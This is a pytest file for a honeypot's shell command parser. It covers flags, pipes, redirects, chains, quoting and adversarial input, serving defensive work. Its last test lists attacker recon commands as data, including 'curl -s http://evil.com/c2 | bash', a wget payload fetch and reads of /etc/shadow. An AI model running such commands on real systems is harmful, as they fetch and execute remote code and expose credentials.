"""Tests for honeypot/command_parser.py (Sprint 3, Step 1).

Covers every parsing scenario listed in the Sprint 3 guide plus edge
cases that real attackers produce: binary garbage, SQL injection strings
in shell, absurdly long input, and empty / whitespace-only lines.
"""
from __future__ import annotations

import pytest

from honeypot.command_parser import ParsedCommand, parse_command


# ---------------------------------------------------------------------------
# Basic binary + args + flags
# ---------------------------------------------------------------------------

class TestBasicParsing:
    def test_simple_command(self) -> None:
        cmd = parse_command("ls")
        assert cmd.binary == "ls"
        assert cmd.args == []
        assert cmd.flags == []

    def test_ls_la_home(self) -> None:
        cmd = parse_command("ls -la /home/ubuntu")
        assert cmd.binary == "ls"
        assert cmd.flags == ["-la"]
        assert cmd.args == ["/home/ubuntu"]

    def test_cat_etc_passwd(self) -> None:
        cmd = parse_command("cat /etc/passwd")
        assert cmd.binary == "cat"
        assert cmd.args == ["/etc/passwd"]
        assert cmd.flags == []

    def test_multiple_flags(self) -> None:
        cmd = parse_command("ls -l -a -h /tmp")
        assert cmd.binary == "ls"
        assert set(cmd.flags) == {"-l", "-a", "-h"}
        assert cmd.args == ["/tmp"]

    def test_long_flag(self) -> None:
        cmd = parse_command("grep --color=auto root /etc/passwd")
        assert cmd.binary == "grep"
        assert "--color=auto" in cmd.flags
        assert "root" in cmd.args
        assert "/etc/passwd" in cmd.args

    def test_ps_aux(self) -> None:
        cmd = parse_command("ps aux")
        assert cmd.binary == "ps"
        assert cmd.flags == ["aux"] or cmd.args == ["aux"]

    def test_uname_a(self) -> None:
        cmd = parse_command("uname -a")
        assert cmd.binary == "uname"
        assert cmd.flags == ["-a"]

    def test_raw_preserved(self) -> None:
        raw = "  ls   -la   /home  "
        cmd = parse_command(raw)
        assert cmd.raw == raw


# ---------------------------------------------------------------------------
# Empty / whitespace input
# ---------------------------------------------------------------------------

class TestEmptyInput:
    def test_empty_string(self) -> None:
        cmd = parse_command("")
        assert cmd.binary == ""
        assert cmd.args == []
        assert cmd.flags == []

    def test_whitespace_only(self) -> None:
        cmd = parse_command("   ")
        assert cmd.binary == ""

    def test_tabs_and_spaces(self) -> None:
        cmd = parse_command("\t  \t")
        assert cmd.binary == ""


# ---------------------------------------------------------------------------
# Pipes
# ---------------------------------------------------------------------------

class TestPipes:
    def test_simple_pipe(self) -> None:
        cmd = parse_command("ps aux | grep root")
        assert cmd.binary == "ps"
        assert cmd.is_piped is True
        assert cmd.pipe_target == "grep root"

    def test_multiple_pipes(self) -> None:
        cmd = parse_command("cat /etc/passwd | grep root | wc -l")
        assert cmd.binary == "cat"
        assert cmd.is_piped is True
        assert cmd.pipe_target is not None
        assert "grep root" in cmd.pipe_target

    def test_no_pipe(self) -> None:
        cmd = parse_command("whoami")
        assert cmd.is_piped is False
        assert cmd.pipe_target is None

    def test_double_pipe_is_not_pipe(self) -> None:
        """``||`` is a logical OR chain, not a pipe."""
        cmd = parse_command("ls /nonexistent || echo fallback")
        assert cmd.is_piped is False
        assert cmd.is_chained is True


# ---------------------------------------------------------------------------
# Redirects
# ---------------------------------------------------------------------------

class TestRedirects:
    def test_output_redirect(self) -> None:
        cmd = parse_command("echo hello > /tmp/out.txt")
        assert cmd.binary == "echo"
        assert len(cmd.redirects) >= 1
        redir_str = " ".join(cmd.redirects)
        assert "/tmp/out.txt" in redir_str

    def test_append_redirect(self) -> None:
        cmd = parse_command("echo line >> /tmp/log")
        redir_str = " ".join(cmd.redirects)
        assert ">>" in redir_str
        assert "/tmp/log" in redir_str

    def test_stderr_redirect(self) -> None:
        cmd = parse_command("find / -name foo 2> /dev/null")
        assert cmd.binary == "find"
        redir_str = " ".join(cmd.redirects)
        assert "2>" in redir_str

    def test_input_redirect(self) -> None:
        cmd = parse_command("wc -l < /etc/passwd")
        assert cmd.binary == "wc"
        redir_str = " ".join(cmd.redirects)
        assert "<" in redir_str


# ---------------------------------------------------------------------------
# Environment variables
# ---------------------------------------------------------------------------

class TestEnvVars:
    def test_dollar_home(self) -> None:
        cmd = parse_command("echo $HOME")
        assert "HOME" in cmd.env_refs

    def test_dollar_user(self) -> None:
        cmd = parse_command("echo $USER")
        assert "USER" in cmd.env_refs

    def test_braces(self) -> None:
        cmd = parse_command("echo ${PATH}")
        assert "PATH" in cmd.env_refs

    def test_multiple_vars(self) -> None:
        cmd = parse_command("echo $HOME $USER $SHELL")
        assert set(cmd.env_refs) >= {"HOME", "USER", "SHELL"}

    def test_expansion_with_env(self) -> None:
        env = {"HOME": "/home/ubuntu", "USER": "ubuntu"}
        cmd = parse_command("echo $HOME", env=env)
        assert "/home/ubuntu" in cmd.args

    def test_no_expansion_without_env(self) -> None:
        cmd = parse_command("echo $HOME")
        assert "$HOME" in cmd.args or "HOME" in cmd.env_refs


# ---------------------------------------------------------------------------
# Chained commands (; && ||)
# ---------------------------------------------------------------------------

class TestChainedCommands:
    def test_semicolon_chain(self) -> None:
        cmd = parse_command("ls; cat /etc/passwd; whoami")
        assert cmd.is_chained is True
        assert len(cmd.chained_commands) == 3
        assert cmd.chained_commands[0] == "ls"
        assert cmd.binary == "ls"

    def test_and_chain(self) -> None:
        cmd = parse_command("cd /tmp && ls -la")
        assert cmd.is_chained is True
        assert len(cmd.chained_commands) == 2
        assert cmd.binary == "cd"

    def test_or_chain(self) -> None:
        cmd = parse_command("ls /foo || echo not_found")
        assert cmd.is_chained is True
        assert len(cmd.chained_commands) == 2

    def test_single_command_not_chained(self) -> None:
        cmd = parse_command("whoami")
        assert cmd.is_chained is False
        assert cmd.chained_commands == []


# ---------------------------------------------------------------------------
# sudo / su subcommands
# ---------------------------------------------------------------------------

class TestSudoSu:
    def test_sudo_su(self) -> None:
        cmd = parse_command("sudo su -")
        assert cmd.binary == "sudo"
        assert cmd.subcommand == "su"

    def test_sudo_cat(self) -> None:
        cmd = parse_command("sudo cat /etc/shadow")
        assert cmd.binary == "sudo"
        assert cmd.subcommand == "cat"
        assert "/etc/shadow" in cmd.args

    def test_sudo_with_flag(self) -> None:
        cmd = parse_command("sudo -u www-data whoami")
        assert cmd.binary == "sudo"
        assert "-u" in cmd.flags
        assert cmd.subcommand == "www-data" or cmd.subcommand == "whoami"

    def test_su_user(self) -> None:
        cmd = parse_command("su root")
        assert cmd.binary == "su"
        assert cmd.subcommand == "root"

    def test_sudo_alone(self) -> None:
        cmd = parse_command("sudo")
        assert cmd.binary == "sudo"
        assert cmd.subcommand is None


# ---------------------------------------------------------------------------
# Quoting
# ---------------------------------------------------------------------------

class TestQuoting:
    def test_single_quotes(self) -> None:
        cmd = parse_command("echo 'hello world'")
        assert cmd.binary == "echo"
        assert "hello world" in cmd.args

    def test_double_quotes(self) -> None:
        cmd = parse_command('echo "hello world"')
        assert cmd.binary == "echo"
        assert "hello world" in cmd.args

    def test_python_c(self) -> None:
        cmd = parse_command("python3 -c 'import os; print(os.getcwd())'")
        assert cmd.binary == "python3"
        assert "-c" in cmd.flags
        assert any("import os" in a for a in cmd.args)

    def test_quoted_semicolon_not_chain(self) -> None:
        cmd = parse_command("echo 'hello; world'")
        assert cmd.is_chained is False
        assert "hello; world" in cmd.args


# ---------------------------------------------------------------------------
# Adversarial / edge-case inputs
# ---------------------------------------------------------------------------

class TestAdversarialInput:
    def test_semicolon_only(self) -> None:
        cmd = parse_command(";")
        assert cmd.binary == ""

    def test_sql_injection(self) -> None:
        cmd = parse_command("' OR 1=1 --")
        assert isinstance(cmd, ParsedCommand)
        assert cmd.binary != ""  # should parse something, not crash

    def test_binary_garbage(self) -> None:
        cmd = parse_command("\x00\x01\x02")
        assert isinstance(cmd, ParsedCommand)

    def test_very_long_input(self) -> None:
        long_input = "A" * 10_000
        cmd = parse_command(long_input)
        assert cmd.binary == long_input
        assert isinstance(cmd, ParsedCommand)

    def test_subshell(self) -> None:
        cmd = parse_command("$(whoami)")
        assert isinstance(cmd, ParsedCommand)

    def test_backtick_subshell(self) -> None:
        cmd = parse_command("`id`")
        assert isinstance(cmd, ParsedCommand)

    def test_hash_comment(self) -> None:
        cmd = parse_command("ls # this is a comment")
        assert cmd.binary == "ls"

    def test_only_flags(self) -> None:
        cmd = parse_command("-la")
        assert cmd.binary == "-la"

    def test_equals_in_arg(self) -> None:
        cmd = parse_command("export FOO=bar")
        assert cmd.binary == "export"
        assert "FOO=bar" in cmd.args

    def test_path_with_spaces(self) -> None:
        cmd = parse_command('cat "/path/with spaces/file.txt"')
        assert cmd.binary == "cat"
        assert "/path/with spaces/file.txt" in cmd.args

    def test_tilde(self) -> None:
        cmd = parse_command("cd ~")
        assert cmd.binary == "cd"
        assert "~" in cmd.args

    def test_dash_dash_separator(self) -> None:
        cmd = parse_command("grep -- -pattern file")
        assert cmd.binary == "grep"
        assert "--" in cmd.flags or "--" in cmd.args

    def test_newline_in_input(self) -> None:
        cmd = parse_command("echo hello\nworld")
        assert cmd.binary == "echo"
        assert isinstance(cmd, ParsedCommand)


# ---------------------------------------------------------------------------
# Combined features
# ---------------------------------------------------------------------------

class TestCombined:
    def test_pipe_and_redirect(self) -> None:
        cmd = parse_command("ps aux | grep root > /tmp/procs.txt")
        assert cmd.binary == "ps"
        assert cmd.is_piped is True

    def test_chain_and_pipe(self) -> None:
        cmd = parse_command("cd /tmp; ls -la | grep log")
        assert cmd.is_chained is True
        assert cmd.chained_commands[0] == "cd /tmp"

    def test_sudo_with_pipe(self) -> None:
        cmd = parse_command("sudo cat /etc/shadow | head -5")
        assert cmd.binary == "sudo"
        assert cmd.subcommand == "cat"
        assert cmd.is_piped is True

    def test_env_in_chain(self) -> None:
        cmd = parse_command("echo $HOME; echo $USER")
        assert cmd.is_chained is True
        assert "HOME" in cmd.env_refs
        assert "USER" in cmd.env_refs

    def test_realistic_recon_sequence(self) -> None:
        commands = [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/passwd",
            "ps aux",
            "netstat -tlnp",
            "ls -la /home",
            "cat /etc/shadow",
            "sudo su -",
            "wget http://evil.com/payload",
            "curl -s http://evil.com/c2 | bash",
            "find / -perm -4000 -type f 2>/dev/null",
            "echo $PATH",
        ]
        for raw in commands:
            cmd = parse_command(raw)
            assert isinstance(cmd, ParsedCommand), f"failed to parse: {raw}"
            assert cmd.binary != "", f"empty binary for: {raw}"
